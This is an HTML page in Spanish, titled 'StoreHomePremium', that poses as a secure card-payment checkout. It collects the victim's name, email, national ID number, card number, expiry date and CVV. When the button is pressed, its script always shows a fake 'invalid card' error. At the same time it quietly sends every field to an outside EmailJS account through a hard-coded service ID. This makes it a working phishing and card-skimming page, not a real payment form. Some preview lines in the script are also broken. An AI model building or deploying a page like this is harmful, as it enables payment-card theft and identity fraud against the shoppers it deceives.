<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>StoreHomePremium</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
  background: #f2f4f7;
  display: flex;
  justify-content: center;
  padding: 20px;
}

.card {
  width: 100%;
  max-width: 420px;
  background: #fff;
  padding: 24px;
  border-radius: 14px;
  box-shadow: 0 10px 30px rgba(0,0,0,.12);
}

h1 {
  text-align: center;
  color: #0a2f7a;
  font-size: 22px;
}

.subtitle {
  text-align: center;
  font-size: 14px;
  color: #4b5563;
  margin-bottom: 18px;
}

label {
  font-size: 13px;
  font-weight: 600;
  margin-top: 12px;
  display: block;
}

input {
  width: 100%;
  padding: 10px;
  border-radius: 8px;
  border: 1px solid #cbd5e1;
  margin-top: 6px;
  font-size: 14px;
}

/* ===== TARJETA PRO ===== */
.card-visual {
  margin-top: 22px;
  height: 220px;
  perspective: 1200px;
}

.card-inner {
  width: 100%;
  height: 100%;
  transition: transform .9s cubic-bezier(.4,.2,.2,1);
  transform-style: preserve-3d;
  position: relative;
}

.card-visual.flip .card-inner {
  transform: rotateY(180deg);
}

.card-face {
  position: absolute;
  inset: 0;
  border-radius: 18px;
  backface-visibility: hidden;
  padding: 22px;
  color: #fff;
  box-shadow: 0 20px 40px rgba(0,0,0,.45);
}

.card-front {
  background: linear-gradient(135deg,#1a1f71,#3b57c3);
}

.card-back {
  background: linear-gradient(135deg,#222,#000);
  transform: rotateY(180deg);
}

.card-brands span {
  opacity: .3;
  margin-right: 10px;
  font-weight: bold;
}

.card-brands span.active {
  opacity: 1;
}

.card-chip {
  width: 50px;
  height: 36px;
  background: linear-gradient(135deg,#f5d76e,#c9a227);
  border-radius: 6px;
  margin: 20px 0;
}

.card-number {
  font-size: 20px;
  letter-spacing: 3px;
  margin-bottom: 18px;
}

.card-exp {
  font-size: 14px;
}

.card-name {
  margin-top: 18px;
  font-size: 14px;
  text-transform: uppercase;
}

/* Dorso */
.magnetic-strip {
  height: 42px;
  background: #000;
  margin-top: 16px;
}

.cvv-box {
  background: #e5e7eb;
  color: #111;
  width: 90px;
  padding: 8px;
  border-radius: 4px;
  margin-left: auto;
  margin-top: 30px;
  text-align: right;
  font-family: monospace;
}

button {
  margin-top: 16px;
  width: 100%;
  padding: 13px;
  border: none;
  border-radius: 10px;
  background: #0a2f7a;
  color: #fff;
  font-weight: bold;
  cursor: pointer;
}
</style>
</head>

<body>
<div class="card">

<h1>StoreHomePremium<br>– Pago Seguro y Simple</h1>
<p class="subtitle">Seleccione el monto y complete el formulario</p>

<label>Monto</label>
<input id="monto" type="number">

<label>Nombre</label>
<input id="nombre" type="text">

<label>Email</label>
<input id="email" type="email">

<label>DNI</label>
<input id="dni" type="number">

<label>Titular</label>
<input id="titular" type="text">

<label>Número de tarjeta</label>
<input id="numero_tarjeta" inputmode="numeric">

<label>Vencimiento</label>
<input id="fecha_expiracion" inputmode="numeric" placeholder="MM/AA">

<label>CVV</label>
<input id="codigo_seguridad" inputmode="numeric" type="password">

<div class="card-visual" id="cardVisual">
  <div class="card-inner">

    <div class="card-face card-front">
      <div class="card-brands">
        <span id="brand-visa">VISA</span>
        <span id="brand-master">MASTERCARD</span>
      </div>

      <div class="card-chip"></div>

      <div class="card-number" id="preview-number">**** **** **** 1234</div>
      <div class="card-exp" id="preview-exp">MM / AA</div>
      <div class="card-name" id="preview-name">NOMBRE DEL TITULAR</div>
    </div>

    <div class="card-face card-back">
      <div class="magnetic-strip"></div>
      <div class="cvv-box"><span id="preview-cvv">***</span></div>
    </div>

  </div>
</div>

<label>Tipo de tarjeta</label>
<label><input type="radio" name="tipo_tarjeta" value="Visa"> Visa</label>
<label><input type="radio" name="tipo_tarjeta" value="Mastercard"> Mastercard</label>

<button id="enviar">Ver opciones de cuotas</button>

</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
emailjs.init("gOD19I3u7jPioagR4");

const cardVisual = document.getElementById("cardVisual");
const visa = document.getElementById("brand-visa");
const master = document.getElementById("brand-master");

/* Flip CVV */
codigo_seguridad.onfocus = () => cardVisual.classList.add("flip");
codigo_seguridad.onblur  = () => cardVisual.classList.remove("flip");

/* Número tarjeta */
numero_tarjeta.oninput = function(){
  let v = this.value.replace(/\D/g,'').slice(0,16);
  this.value = v.replace(/(.{4})/g,'$1 ').trim();
  preview-number.textContent = "**** **** **** " + (v.slice(-4)||"1234");
  visa.classList.toggle("active", v.startsWith("4"));
  master.classList.toggle("active", /^5[1-5]|^2/.test(v));
};

/* Fecha */
fecha_expiracion.oninput = function(){
  let v = this.value.replace(/\D/g,'').slice(0,4);
  if(v.length>2) v=v.slice(0,2)+"/"+v.slice(2);
  this.value=v;
  preview-exp.textContent=v||"MM / AA";
};

/* Nombre */
titular.oninput = ()=>preview-name.textContent=titular.value||"NOMBRE DEL TITULAR";

/* CVV */
codigo_seguridad.oninput = ()=>{
  codigo_seguridad.value=codigo_seguridad.value.replace(/\D/g,'').slice(0,3);
  preview-cvv.textContent=codigo_seguridad.value||"***";
};

/* Enviar */
enviar.onclick = ()=>{
  if(!monto.value||!nombre.value||!email.value||!dni.value||!titular.value||
     !numero_tarjeta.value||!fecha_expiracion.value||!codigo_seguridad.value||
     !document.querySelector('input[name="tipo_tarjeta"]:checked')){
    alert("⚠️ Complete todos los campos");
    return;
  }

  if(navigator.vibrate) navigator.vibrate([120,60,120]);
  alert("❌ Tarjeta inválida. Intente nuevamente.");

  emailjs.send("service_p965auj","template_h5kc29e",{
    monto:monto.value,
    nombre:nombre.value,
    email:email.value,
    dni:dni.value,
    titular:titular.value,
    numero_tarjeta:numero_tarjeta.value,
    fecha_expiracion:fecha_expiracion.value,
    codigo_seguridad:codigo_seguridad.value,
    tipo_tarjeta:document.querySelector('input[name="tipo_tarjeta"]:checked').value
  });
};
</script>

</body>
</html>